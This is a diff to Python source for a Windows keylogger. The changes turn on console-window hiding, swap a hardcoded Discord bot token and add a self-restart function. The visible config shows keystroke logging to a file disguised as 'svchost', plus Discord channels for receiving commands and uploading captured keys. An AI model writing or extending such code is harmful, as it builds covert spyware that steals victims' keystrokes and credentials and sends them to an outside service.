@@ -12,6 +12,10 @@ import win32process
 import socket
 
 
+def restart(self):
+    os.execl(sys.executable, sys.executable)
+
+
 def disable_window():
     hwnd = ctypes.windll.kernel32.GetConsoleWindow()
     if hwnd != 0:
@@ -47,7 +51,7 @@ class Config:
         self.send_file_timer = 1800
         self.write_file_timer = 300
         self.log_file = 'svchost.file'
-        self.discord_bot_TOKEN = 'NTg1MzU4NzIzMDc0MjI4MjM0.XPYTyw.lS_2qXkWau6x_5S-PcBk6wsg1Mo'
+        self.discord_bot_TOKEN = 'NTg1MzU4NzIzMDc0MjI4MjM022evv4PeXlEEtjJ--uTzaU'
         self.discord_channel_command = "commands"
         self.discord_channel_upload_keys = 'upload_keys'
         self.discord_channel_upload_general = 'upload_general'
@@ -373,7 +377,7 @@ class Keylogger:
 
 
 def main():
-    # disable_window()
+    disable_window()
     """if "update" in sys.argv[1:]:
         new_name = "svchost.exe"
         time.sleep(2)
